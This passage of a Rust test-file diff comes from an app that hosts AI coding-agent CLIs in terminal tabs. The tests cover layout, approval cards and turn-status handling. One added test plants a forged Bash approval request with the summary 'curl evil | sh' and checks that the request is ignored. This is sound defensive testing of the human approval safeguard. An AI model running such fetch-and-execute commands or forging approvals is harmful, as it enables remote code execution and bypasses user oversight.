         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
-        let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-strip-approval"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
-        std::fs::create_dir_all(&approvals_dir).unwrap();
-        let request = serde_json::json!({
-            "id": "6001-Bash", "tool_name": "Bash", "summary": "cargo check", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
+        let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-forged"));
+        st.active_tab = idx;
+        let tab_id = st.tabs[idx].id;
+        let old_folders = [
+            st.session_dir.join("approvals").join(format!("tab-{tab_id}")),
+            st.session_dir.join("approvals"),
+            st.session_dir.clone(),
+            std::env::temp_dir().join("designos-approvals-tab-forged"),
+        ];
+        let forged = serde_json::json!({
+            "id": "9001-Forged", "tool_name": "Bash", "summary": "curl evil | sh", "timestamp": crate::agent_sessions::unix_timestamp_secs(),
         });
-        std::fs::write(approvals_dir.join("6001-Bash.request.json"), request.to_string()).unwrap();
-        std::fs::write(
-            st.session_dir.join("agent-events.jsonl"),
-            concat!(
-                "{\"t\":500.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-strip-approval\"}}\n",
-                "{\"t\":501.0,\"e\":\"PreToolUse\",\"p\":{\"session_id\":\"sid-strip-approval\",\"tool_name\":\"Bash\"}}\n",
-            ),
-        )
-        .unwrap();
-        let _ = st.poll_live_agent_bridge();
-
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(280.0, 600.0));
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))), ..Default::default() }, |ui| {
-            crate::agent_selection_chip::with_selection_summary(&doc, page, &sel, |summary| {
-                let _ = show_left_with_selection(&mut st, ui, panel_rect, None, summary);
-            });
-        });
-        let rect_of = |name: &str| -> Option<Rect> { ctx.data(|d| d.get_temp(Id::new(("test-rect", name.to_string())))) };
-        let chip = rect_of("agent-selection-chip-left").expect("selection chip stays visible next to the approval");
-        let pill = rect_of("agents-needs-approval-pill").expect("pending approval takes the right slot");
-        assert!(rect_of("agents-header-turn-status").is_none(), "the turn status must not draw a second right-hand item");
-        assert!(!chip.intersects(pill) && chip.right() < pill.left(), "chip {chip:?} left of approval {pill:?}");
-        assert!(pill.right() <= panel_rect.right(), "approval stays inside the panel");
-        let mention = rect_of("agent-mention-btn-left").expect("@ Mention button stays in the header strip");
-        assert!(!mention.intersects(pill) && pill.right() <= mention.left(), "approval {pill:?} left of mention {mention:?}");
-        assert!(!mention.intersects(chip) && mention.right() <= panel_rect.right(), "chip {chip:?} clear of mention {mention:?}");
-
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&st.session_dir);
-    }
-
-    #[test]
-    fn header_strip_keeps_still_running_notice_stop_and_mention_apart_at_narrow_widths() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, ids) = make_three_layer_doc();
-        let sel = [ids[0], ids[1]];
-        for width in [280.0f32, 300.0] {
-            let mut st = isolated_683_state(68413);
-            let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-strip-still-running"));
-            *st.tabs[idx].agent_status.lock().unwrap() = AgentTabStatus::Working(Some("Thinking".into()));
-            st.tabs[idx].still_running_notice = Some(crate::agent_stop::STILL_RUNNING_NOTICE.to_string());
-
-            let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(width, 600.0));
-            let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))), ..Default::default() }, |ui| {
-                crate::agent_selection_chip::with_selection_summary(&doc, page, &sel, |summary| {
-                    let _ = show_left_with_selection(&mut st, ui, panel_rect, None, summary);
-                });
-            });
-            let rect_of = |name: &str| -> Option<Rect> { ctx.data(|d| d.get_temp(Id::new(("test-rect", name.to_string())))) };
-            let chip = rect_of("agent-selection-chip-left").expect("chip");
-            let notice = rect_of("agents-header-turn-status").expect("still-running notice takes the right slot");
-            let mention = rect_of("agent-mention-btn-left").expect("@ Mention button");
-            let stop = rect_of("agents-header-stop-btn").expect("Stop button");
-            let strip = [("chip", chip), ("notice", notice), ("mention", mention)];
-            for (i, (an, a)) in strip.iter().enumerate() {
-                assert!(a.left() >= panel_rect.left() && a.right() <= panel_rect.right(), "{an} {a:?} inside {width}px panel");
-                for (bn, b) in strip.iter().skip(i + 1) {
-                    assert!(!a.intersects(*b), "{an} {a:?} overlaps {bn} {b:?} at {width}px");
-                }
-            }
-            assert!(chip.right() <= notice.left() && notice.right() <= mention.left(), "chip | notice | mention order at {width}px");
-            assert!(stop.left() >= panel_rect.left() && stop.right() <= panel_rect.right(), "Stop {stop:?} inside the {width}px panel");
-            assert!(stop.bottom() <= chip.top().min(mention.top()), "Stop sits in the chrome bar above the strip");
-
-            // A token/cost readout (`#678`) joins the strip: it never overlaps the chip, the turn status or `@ Mention`,
-            // and it yields (is not drawn) when the notice leaves it no room.
-            st.tabs[idx].usage = crate::agent_usage::TabUsageTracker::new(Some(crate::agent_usage::UsageReading {
-                input: 412_000,
-                output: 13_000,
-                cost: Some(crate::agent_usage::CostLabel::Reference(0.42)),
-                source: crate::agent_usage::UsageSource::ClaudeTranscript,
-                as_of_ms: 1,
-            }));
-            let run_frame = |st: &mut TerminalState| {
-                let _ =
-                    ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))), ..Default::default() }, |ui| {
-                        crate::agent_selection_chip::with_selection_summary(&doc, page, &sel, |summary| {
-                            let _ = show_left_with_selection(st, ui, panel_rect, None, summary);
-                        });
-                    });
-            };
-            run_frame(&mut st);
-            let chip = rect_of("agent-selection-chip-left").expect("chip");
-            let notice = rect_of("agents-header-turn-status").expect("notice");
-            let mention = rect_of("agent-mention-btn-left").expect("@ Mention button");
-            let mut strip = vec![("chip", chip), ("notice", notice), ("mention", mention)];
-            if let Some(usage) = rect_of("agents-header-usage") {
-                assert!(
-                    chip.right() <= usage.left() && usage.right() <= mention.left() && notice.right() <= usage.left(),
-                    "chip | notice | usage | mention order"
-                );
-                strip.push(("usage", usage));
-            }
-            for (i, (an, a)) in strip.iter().enumerate() {
-                assert!(a.left() >= panel_rect.left() && a.right() <= panel_rect.right(), "{an} {a:?} inside {width}px panel");
-                for (bn, b) in strip.iter().skip(i + 1) {
-                    assert!(!a.intersects(*b), "{an} {a:?} overlaps {bn} {b:?} at {width}px with usage");
-                }
-            }
-
-            // Idle tab: no status competes, so the readout is drawn between the chip and `@ Mention`.
-            st.tabs[idx].still_running_notice = None;
-            *st.tabs[idx].agent_status.lock().unwrap() = AgentTabStatus::Idle;
-            run_frame(&mut st);
-            let chip = rect_of("agent-selection-chip-left").expect("chip");
-            let mention = rect_of("agent-mention-btn-left").expect("@ Mention button");
-            let usage = rect_of("agents-header-usage").expect("usage readout fits beside the chip on an idle tab");
-            assert!(chip.right() <= usage.left() && usage.right() <= mention.left(), "chip | usage | mention order at {width}px");
-            assert!(usage.left() >= panel_rect.left() && usage.right() <= panel_rect.right(), "usage inside {width}px panel");
-
-            kill_tabs(&mut st);
-            let _ = std::fs::remove_dir_all(&st.session_dir);
+        for dir in &old_folders {
+            std::fs::create_dir_all(dir).unwrap();
+            std::fs::write(dir.join("9001-Forged.request.json"), forged.to_string()).unwrap();
         }
-    }
+        let _ = st.poll_live_agent_bridge();
+        assert!(st.pending_approvals.is_empty(), "a request forged in the session folder raised a card: {:?}", st.pending_approvals);
+        assert!(st.tabs[idx].pending_approvals.is_empty());
+        assert!(!st.needs_approval());
+        assert_ne!(
+            st.tabs[idx].effective_status(),
+            AgentTabStatus::WaitingForInput(Some("Needs approval".into())),
+            "a forged request must not put the tab in `Needs approval`"
+        );
 
-    #[test]
-    fn esc_with_the_mention_popup_open_closes_the_popup_and_does_not_stop_the_turn() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, _ids) = make_three_layer_doc();
-        let mut st = isolated_683_state(68414);
-        let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-esc-popup"));
-        *st.tabs[idx].agent_status.lock().unwrap() = AgentTabStatus::Working(Some("Thinking".into()));
-        st.viewport_focused = false;
-        st.chrome_focused = true;
-        st.mention_popup.toggle_terminal_mode_for("agents-left-pty", &doc, page);
-        assert!(st.mention_popup.is_open());
-
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(300.0, 600.0));
-        let esc_frame = |st: &mut TerminalState| {
-            let raw = egui::RawInput {
-                screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))),
-                events: vec![egui::Event::Key { key: Key::Escape, physical_key: None, pressed: true, repeat: false, modifiers: egui::Modifiers::NONE }],
-                ..Default::default()
-            };
-            let _ = ctx.run_ui(raw, |ui| {
-                crate::agent_selection_chip::with_selection_summary(&doc, page, &[], |summary| {
-                    let _ = show_left_with_doc(st, ui, panel_rect, None, summary, &doc, page);
-                });
-            });
-        };
-        esc_frame(&mut st);
-        assert!(!st.mention_popup.is_open(), "Esc closes the popup");
-        assert!(st.tabs[idx].stop_state.is_none(), "the same Esc must not stop the running turn");
-        assert!(st.tabs[idx].stop_sent_keys.is_empty(), "no interrupt key was sent");
-
-        esc_frame(&mut st);
-        assert!(st.tabs[idx].stop_state.is_some(), "a second Esc with the popup closed stops the turn");
-
+        st.answer_pending_approval("9001-Forged", crate::agent_permissions::ApprovalDecision::Allow);
+        for dir in &old_folders {
+            assert!(!dir.join("9001-Forged.answer").exists(), "an answer was written into {}", dir.display());
+        }
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
+        let _ = std::fs::remove_dir_all(&old_folders[3]);
     }
 
     #[test]
@@ -9486,7 +10905,7 @@ mod tests {
     }
 
     #[test]
-    fn approval_card_stacks_between_the_strip_and_the_receipt_row_without_overlap() {
+    fn approval_card_stacks_between_the_header_and_the_receipt_row_without_overlap() {
         let ctx = egui::Context::default();
         crate::theme::install_fonts(&ctx);
         crate::theme::apply(&ctx);
@@ -9495,9 +10914,9 @@ mod tests {
         let mut st = isolated_683_state(69413);
         st.permission_mode = crate::agent_permissions::AgentPermissionMode::Ask;
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stack"));
-        let approvals_dir = st.tabs[idx].approvals_dir.clone();
+        let approvals_dir = st.tabs[idx].approvals_dir.clone().expect("a session tab has a private approvals folder");
         std::fs::create_dir_all(&approvals_dir).unwrap();
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         // Turn 1 finished (receipt row), turn 2 is waiting on a permission request (approval card).
         std::fs::write(
             &events_path,
@@ -9526,14 +10945,16 @@ mod tests {
                     let _ = show_left_with_selection(&mut st, ui, panel_rect, None, summary);
                 });
             });
-            let chip = rect_of("agent-selection-chip-left").expect("chip");
-            let pill = rect_of("agents-needs-approval-pill").expect("approval status in the strip");
+            let header_bottom = panel_rect.top() + TERMINAL_HEADER_H;
+            let chip = rect_of("agent-selection-chip").expect("chip");
+            let composer = rect_of("agents-composer-box").expect("composer box");
             let card = rect_of("agent-approval-card").expect("approval card");
             let receipt = rect_of("agents-turn-receipt-line").expect("receipt row");
-            assert!(!chip.intersects(pill), "h={height}: chip {chip:?} vs approval status {pill:?}");
-            assert!(pill.bottom() <= card.top() + 0.5, "h={height}: strip {pill:?} above the card {card:?}");
+            assert!(composer.contains_rect(chip), "h={height}: the selection chip {chip:?} lives inside the composer box {composer:?}");
+            assert!(rect_of("agents-needs-approval-pill").is_none(), "h={height}: the strip pill is gone, the card says it");
+            assert!(header_bottom <= card.top() + 0.5, "h={height}: header {header_bottom} above the card {card:?}");
             assert!(card.bottom() <= receipt.top() + 0.5, "h={height}: card {card:?} above the receipt row {receipt:?}");
-            assert!(receipt.bottom() <= panel_rect.bottom() + 0.5, "h={height}: receipt row inside the panel");
+            assert!(receipt.bottom() <= composer.top() + 0.5, "h={height}: receipt row {receipt:?} above the composer {composer:?}");
         }
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
@@ -9543,7 +10964,7 @@ mod tests {
     fn event_stream_status_changes_drive_the_tab_turn_ledger() {
         let mut st = isolated_683_state(68399);
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-ledger"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":300.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-ledger\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
         assert_eq!(st.ledger_for_tab_mut(idx).turns.len(), 1, "a Working status from the event stream opens a turn");
@@ -9558,8 +10979,9 @@ mod tests {
 
     #[test]
     fn works_for_each_cli_hook_file() {
-        let status_path = std::path::Path::new("/tmp/designos-683-hooks-check/agent-status.json");
-        let claude_grok = session_hooks_settings(status_path, None, None);
+        let status_path =
+            &crate::agent_hook_outputs::HookPaths::at(std::path::Path::new("/tmp/designos-683-session"), std::path::Path::new("/tmp/designos-683-hooks-check"));
+        let claude_grok = session_hooks_settings(status_path, None, false);
         for &(event, _) in crate::agent_turn_status::CLAUDE_GROK_HOOK_EVENTS {
             let cmd = claude_grok["hooks"][event][0]["hooks"][0]["command"].as_str().unwrap_or_default();
             assert!(cmd.contains("agent-events.jsonl"), "Claude/Grok hook for {event} must append to agent-events.jsonl: {cmd}");
@@ -9581,7 +11003,7 @@ mod tests {
         st.active_tab = codex_idx;
 
         // Write an event to agent-events.jsonl: Codex must ignore it.
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":10.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"codex-sid\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
         // The backing shell prints its prompt on start, and a loaded machine can deliver it at any moment during this test. That
@@ -9594,12 +11016,13 @@ mod tests {
         *st.tabs[codex_idx].last_output_at.lock().unwrap() = Some(output_at);
         assert_eq!(st.tabs[codex_idx].effective_status_at(output_at), AgentTabStatus::Working(None));
 
-        // Heuristic / OSC status drives Codex Running -> Done.
+        // Heuristic / OSC status drives Codex Running -> Done once quiet for 1.5 s (#1194).
         let (_, working) = parse_osc_agent_status_and_strip("\x1b]9999;working:Thinking\x07");
         if let Some(next) = working {
             *st.tabs[codex_idx].agent_status.lock().unwrap() = next;
         }
-        assert!(matches!(st.tabs[codex_idx].effective_status_at(quiet), AgentTabStatus::Working(_)));
+        assert!(matches!(st.tabs[codex_idx].effective_status_at(output_at + std::time::Duration::from_millis(1_400)), AgentTabStatus::Working(_)));
+        assert_eq!(st.tabs[codex_idx].effective_status_at(quiet), AgentTabStatus::Done);
         let (_, done) = parse_osc_agent_status_and_strip("\x1b]9999;done\x07");
         if let Some(next) = done {
             *st.tabs[codex_idx].agent_status.lock().unwrap() = next;
@@ -9609,10 +11032,116 @@ mod tests {
     }
 
     #[test]
+    fn codex_turn_end_pure_decay_and_precedence_rules() {
+        let t0 = std::time::Instant::now();
+        // 1. Working, quiet 1.4 s -> still Working
+        assert_eq!(
+            resolve_pty_heuristic_status(AgentTabStatus::Working(Some("Working…".into())), Some(t0), t0 + std::time::Duration::from_millis(1_400)),
+            AgentTabStatus::Working(Some("Working…".into()))
+        );
+        // 2. Working, quiet 1.5 s -> Done
+        let decayed = resolve_pty_heuristic_status(AgentTabStatus::Working(Some("Working…".into())), Some(t0), t0 + std::time::Duration::from_millis(1_500));
+        assert_eq!(decayed, AgentTabStatus::Done);
+        // 3. WaitingForInput, quiet 60 s -> still WaitingForInput
+        assert_eq!(
+            resolve_pty_heuristic_status(AgentTabStatus::WaitingForInput(Some("Approval".into())), Some(t0), t0 + std::time::Duration::from_secs(60)),
+            AgentTabStatus::WaitingForInput(Some("Approval".into()))
+        );
+        // 4. Stopped and Error are unchanged (both when quiet and when recent PTY output arrived)
+        for delta in [std::time::Duration::from_millis(100), std::time::Duration::from_secs(60)] {
+            assert_eq!(resolve_pty_heuristic_status(AgentTabStatus::Stopped, Some(t0), t0 + delta), AgentTabStatus::Stopped);
+            assert_eq!(
+                resolve_pty_heuristic_status(AgentTabStatus::Error(Some("exit code 1".into())), Some(t0), t0 + delta),
+                AgentTabStatus::Error(Some("exit code 1".into()))
+            );
+        }
+        // 5. A new Working after Done (next turn), plus turn_ledger Active -> Completed -> Active transitions
+        let mut ledger = crate::agent_turn_ledger::AgentTurnLedger::default();
+        let t_work1 = t0 + std::time::Duration::from_millis(200);
+        let st_work1 = resolve_pty_heuristic_status(AgentTabStatus::Working(None), Some(t0), t_work1);
+        assert_eq!(st_work1, AgentTabStatus::Working(None));
+        ledger.on_status_change(matches!(st_work1, AgentTabStatus::Working(_)), 0, t_work1);
+        assert_eq!(ledger.turns.last().map(|t| t.state), Some(crate::agent_turn_ledger::TurnState::Active));
+
+        let t_done1 = t0 + std::time::Duration::from_millis(1_500);
+        let st_done1 = resolve_pty_heuristic_status(AgentTabStatus::Working(None), Some(t0), t_done1);
+        assert_eq!(st_done1, AgentTabStatus::Done);
+        ledger.on_status_change(matches!(st_done1, AgentTabStatus::Working(_)), 10, t_done1);
+        assert_eq!(ledger.turns.len(), 1);
+        assert_eq!(ledger.turns[0].state, crate::agent_turn_ledger::TurnState::Completed);
+
+        // Next turn starts at t0 + 10 s
+        let t_turn2_out = t0 + std::time::Duration::from_secs(10);
+        let t_turn2_check = t_turn2_out + std::time::Duration::from_millis(200);
+        let st_work2_from_done = resolve_pty_heuristic_status(AgentTabStatus::Done, Some(t_turn2_out), t_turn2_check);
+        assert_eq!(st_work2_from_done, AgentTabStatus::Working(None));
+        let st_work2_explicit = resolve_pty_heuristic_status(AgentTabStatus::Working(Some("Next turn".into())), Some(t_turn2_out), t_turn2_check);
+        assert_eq!(st_work2_explicit, AgentTabStatus::Working(Some("Next turn".into())));
+        ledger.on_status_change(matches!(st_work2_explicit, AgentTabStatus::Working(_)), 10, t_turn2_check);
+        assert_eq!(ledger.turns.len(), 2);
+        assert_eq!(ledger.turns.last().map(|t| (t.id, t.state)), Some((2, crate::agent_turn_ledger::TurnState::Active)));
+    }
+
+    #[test]
+    fn codex_turn_end_stub_pty_turn_decays_to_done_closes_ledger_and_hides_stop() {
+        let mut st = isolated_683_state(68394);
+        let mut cmd = build_agent_shell_cmd(&default_shell_program(), "sh -c 'printf \"\\033]0;\\342\\240\\213 codex\\007\"; sleep 5'");
+        isolate_zsh_from_home(&mut cmd);
+        let tab = TerminalTab::spawn_with_session_cmd(1, AgentCliPreset::Codex, 24, 80, None, None, Some(cmd)).expect("spawn codex stub");
+        st.tabs.push(tab);
+        st.active_tab = 0;
+
+        let deadline = std::time::Instant::now() + crate::test_timing::STUB_WAIT;
+        while !matches!(st.tabs[0].effective_status(), AgentTabStatus::Working(_)) && std::time::Instant::now() < deadline {
+            let _ = st.poll_live_agent_bridge();
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        }
+        let _ = st.poll_live_agent_bridge();
+        assert!(matches!(st.tabs[0].effective_status(), AgentTabStatus::Working(_)), "stub Codex PTY spinner must enter Working");
+        assert!(crate::agent_stop::is_tab_turn_running(&st.tabs[0]), "Stop must be eligible while Codex is Working");
+        let working = st.is_tab_working(0);
+        st.tabs[0].turn_ledger.tick(working, std::time::Instant::now());
+        assert_eq!(st.tabs[0].turn_ledger.turns.last().map(|t| t.state), Some(crate::agent_turn_ledger::TurnState::Active));
+
+        // Advance quiet time to 1.5 s and poll.
+        *st.tabs[0].last_output_at.lock().unwrap() = Some(std::time::Instant::now() - PTY_HEURISTIC_WORKING_DECAY);
+        let _ = st.poll_live_agent_bridge();
+        let working_after_decay = st.is_tab_working(0);
+        st.tabs[0].turn_ledger.tick(working_after_decay, std::time::Instant::now());
+        assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Done, "Codex tab must decay to Done after 1.5 s of PTY quiet");
+        assert!(!crate::agent_stop::is_tab_turn_running(&st.tabs[0]), "Stop must hide once Codex turn decays to Done");
+        assert!(st.tabs[0].turn_ledger.turns.is_empty(), "active heuristic turn must close on decay");
+        kill_tabs(&mut st);
+    }
+
+    /// The PTY-heuristic poll writes back only the quiet `Working → Done` decay. Fresh PTY bytes
+    /// show `Done`/`Idle` as `Working(None)` for display, but composer echo is not a turn, so that
+    /// promotion is never written back or announced (`#1194`).
+    #[test]
+    fn codex_status_poll_persists_only_the_working_to_done_decay() {
+        let working = AgentTabStatus::Working(Some("Working…".into()));
+        let shown_working = AgentTabStatus::Working(None);
+        assert_eq!(persisted_pty_heuristic_status(&working, &AgentTabStatus::Done), Some(AgentTabStatus::Done));
+        assert_eq!(persisted_pty_heuristic_status(&AgentTabStatus::Done, &shown_working), None, "composer echo after a turn");
+        assert_eq!(persisted_pty_heuristic_status(&AgentTabStatus::Idle, &shown_working), None, "composer echo before a turn");
+        assert_eq!(persisted_pty_heuristic_status(&working, &working), None);
+        let waiting = AgentTabStatus::WaitingForInput(None);
+        assert_eq!(persisted_pty_heuristic_status(&waiting, &waiting), None);
+        assert_eq!(persisted_pty_heuristic_status(&AgentTabStatus::Stopped, &AgentTabStatus::Stopped), None);
+
+        let now = std::time::Instant::now();
+        let echo = resolve_pty_heuristic_status(AgentTabStatus::Done, Some(now), now);
+        assert_eq!(echo, shown_working, "output under 600 ms still displays as Working");
+        assert_eq!(persisted_pty_heuristic_status(&AgentTabStatus::Done, &echo), None);
+        let quiet = resolve_pty_heuristic_status(working.clone(), Some(now - PTY_HEURISTIC_WORKING_DECAY), now);
+        assert_eq!(persisted_pty_heuristic_status(&working, &quiet), Some(AgentTabStatus::Done));
+    }
+
+    #[test]
     fn theme_has_info_success_warning_in_token_parity() {
         assert_eq!(theme::INFO, Color32::from_rgb(0x0D, 0x99, 0xFF));
-        assert_eq!(theme::SUCCESS, Color32::from_rgb(0x14, 0xAE, 0x5C));
-        assert_eq!(theme::WARNING, Color32::from_rgb(0xF5, 0x9E, 0x0B));
+        assert_eq!(theme::SUCCESS, Color32::from_rgb(0x22, 0xC5, 0x5E));
+        assert_eq!(theme::WARNING, Color32::from_rgb(0xEA, 0xB3, 0x08));
 
         let manifest_dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
         let script = manifest_dir.join("../../scripts/design_os_self_evolve.py");
@@ -9625,8 +11154,8 @@ mod tests {
         let tokens_raw = std::fs::read_to_string(&tokens_path).expect("read design.tokens.json");
         let tokens_json: serde_json::Value = serde_json::from_str(&tokens_raw).expect("parse design.tokens.json");
         assert_eq!(tokens_json["colors"]["info"]["$value"].as_str(), Some("#0d99ff"));
-        assert_eq!(tokens_json["colors"]["success"]["$value"].as_str(), Some("#14ae5c"));
-        assert_eq!(tokens_json["colors"]["warning"]["$value"].as_str(), Some("#f59e0b"));
+        assert_eq!(tokens_json["colors"]["success"]["$value"].as_str(), Some("#22c55e"));
+        assert_eq!(tokens_json["colors"]["warning"]["$value"].as_str(), Some("#eab308"));
     }
 
     #[test]
@@ -9635,7 +11164,7 @@ mod tests {
         let tab_a = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-a"));
         let tab_b = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-b"));
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -9670,7 +11199,7 @@ mod tests {
         let mut st_mixed = isolated_683_state(68311);
         let claude_idx = spawn_mock_agent_tab(&mut st_mixed, AgentCliPreset::Claude, Some("sid-claude-read"));
         let _codex_idx = spawn_mock_agent_tab(&mut st_mixed, AgentCliPreset::Codex, None);
-        let mixed_events = st_mixed.session_dir.join("agent-events.jsonl");
+        let mixed_events = st_mixed.prepared_hook_paths().events();
         std::fs::write(
             &mixed_events,
             concat!(
@@ -9726,15 +11255,16 @@ mod tests {
         assert_eq!(records.len(), 16, "all 16 concurrent hook records must parse cleanly");
         let _ = std::fs::remove_dir_all(&tmp);
 
-        // Verify spawning a tab removes any stale `.lock` directories in `session_dir`.
+        // Verify spawning a tab removes any stale `.lock` directories in the hook folder of its session.
         let mut st = isolated_683_state(68312);
-        let stale_events_lock = st.session_dir.join("agent-events.jsonl.lock");
-        let stale_status_lock = st.session_dir.join("agent-status.jsonl.lock");
+        let hook_dir = st.prepared_hook_paths();
+        let stale_events_lock = hook_dir.dir().join("agent-events.jsonl.lock");
+        let stale_transcript_lock = hook_dir.dir().join("claude-transcript.json.lock");
         std::fs::create_dir_all(&stale_events_lock).unwrap();
-        std::fs::create_dir_all(&stale_status_lock).unwrap();
+        std::fs::create_dir_all(&stale_transcript_lock).unwrap();
         let _ = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-lock-clean"));
         assert!(!stale_events_lock.exists(), "spawning a tab must remove stale agent-events.jsonl.lock");
-        assert!(!stale_status_lock.exists(), "spawning a tab must remove stale agent-status.jsonl.lock");
+        assert!(!stale_transcript_lock.exists(), "spawning a tab must remove stale claude-transcript.json.lock");
         kill_tabs(&mut st);
     }
 
@@ -9750,7 +11280,7 @@ mod tests {
         st.window_focused = false;
         st.surface_visible = true;
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":10.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-exit-1\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
 
@@ -9764,9 +11294,79 @@ mod tests {
             std::thread::sleep(std::time::Duration::from_millis(10));
         }
 
-        assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Done);
+        assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Error(Some("exit code 1".to_string())));
         assert_eq!(st.tabs[0].last_turn_receipt().map(|r| r.format_line()), Some("Ended without reporting a result".to_string()));
         assert_eq!(sink.count(), 1, "process exit during a running turn while unfocused must send a Finished notification");
+    }
+
+    #[test]
+    fn codex_turn_end_pty_exit_while_working_or_waiting_maps_stop_and_errors_across_presets() {
+        // 1. User-requested Stop while Working ends as Stopped on PTY exit
+        {
+            let mut st = isolated_683_state(68395);
+            let mut cmd = build_agent_shell_cmd(&default_shell_program(), "sh -c 'exit 0'");
+            isolate_zsh_from_home(&mut cmd);
+            let tab = TerminalTab::spawn_with_session_cmd(1, AgentCliPreset::Codex, 24, 80, None, None, Some(cmd)).expect("spawn codex exit stub");
+            *tab.agent_status.lock().unwrap() = AgentTabStatus::Working(None);
+            tab.stop_in_flight.store(true, std::sync::atomic::Ordering::Relaxed);
+            st.tabs.push(tab);
+            st.active_tab = 0;
+            let deadline = std::time::Instant::now() + crate::test_timing::STUB_WAIT;
+            while !st.tabs[0].exited_notice_shown && std::time::Instant::now() < deadline {
+                let _ = st.poll_live_agent_bridge();
+                std::thread::sleep(std::time::Duration::from_millis(10));
+            }
+            assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Stopped);
+            assert!(!crate::agent_stop::is_tab_turn_running(&st.tabs[0]));
+            kill_tabs(&mut st);
+        }
+
+        // 2. Exit 0 without user stop while Working or WaitingForInput ends as Error("exit code 0") across presets
+        for (i, (preset, initial_status)) in [
+            (AgentCliPreset::Codex, AgentTabStatus::Working(None)),
+            (AgentCliPreset::Claude, AgentTabStatus::WaitingForInput(Some("Bash".into()))),
+            (AgentCliPreset::Grok, AgentTabStatus::Working(Some("Working…".into()))),
+            (AgentCliPreset::Antigravity, AgentTabStatus::WaitingForInput(None)),
+            (AgentCliPreset::Gemini, AgentTabStatus::Working(None)),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let mut st = isolated_683_state(68396 + i as u64);
+            let mut cmd = build_agent_shell_cmd(&default_shell_program(), "sh -c 'echo ok; exit 0'");
+            isolate_zsh_from_home(&mut cmd);
+            let tab = TerminalTab::spawn_with_session_cmd(1, preset, 24, 80, None, None, Some(cmd)).expect("spawn preset exit 0 stub");
+            *tab.agent_status.lock().unwrap() = initial_status;
+            st.tabs.push(tab);
+            st.active_tab = 0;
+            let deadline = std::time::Instant::now() + crate::test_timing::STUB_WAIT;
+            while !st.tabs[0].exited_notice_shown && std::time::Instant::now() < deadline {
+                let _ = st.poll_live_agent_bridge();
+                std::thread::sleep(std::time::Duration::from_millis(10));
+            }
+            assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Error(Some("exit code 0".to_string())), "{preset:?}");
+            assert!(!crate::agent_stop::is_tab_turn_running(&st.tabs[0]), "{preset:?}");
+            kill_tabs(&mut st);
+        }
+
+        // 3. Non-zero exit (code 7) while Working ends as Error("exit code 7")
+        {
+            let mut st = isolated_683_state(68410);
+            let mut cmd = build_agent_shell_cmd(&default_shell_program(), "sh -c 'echo crash; exit 7'");
+            isolate_zsh_from_home(&mut cmd);
+            let tab = TerminalTab::spawn_with_session_cmd(1, AgentCliPreset::Codex, 24, 80, None, None, Some(cmd)).expect("spawn codex exit 7 stub");
+            *tab.agent_status.lock().unwrap() = AgentTabStatus::Working(None);
+            st.tabs.push(tab);
+            st.active_tab = 0;
+            let deadline = std::time::Instant::now() + crate::test_timing::STUB_WAIT;
+            while !st.tabs[0].exited_notice_shown && std::time::Instant::now() < deadline {
+                let _ = st.poll_live_agent_bridge();
+                std::thread::sleep(std::time::Duration::from_millis(10));
+            }
